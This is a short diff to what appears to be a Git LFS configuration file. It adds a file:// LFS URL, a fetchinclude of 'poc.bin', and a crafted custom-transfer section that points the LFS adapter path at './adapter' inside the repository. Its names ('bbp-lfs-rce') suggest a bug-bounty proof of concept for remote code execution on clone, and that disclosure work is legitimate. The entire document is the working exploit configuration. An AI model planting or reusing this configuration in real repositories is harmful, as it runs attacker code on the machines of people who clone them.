@@ -1,2 +1,6 @@
 [lfs]
-    url = "http://127.0.0.1:15000/quitquitquit#x"
+    url = file:///bbp-lfs-rce-no-such-repository
+    fetchinclude = poc.bin
+
+[lfs "customtransfer.lfs-standalone-file.path"]
+    access = ./adapter
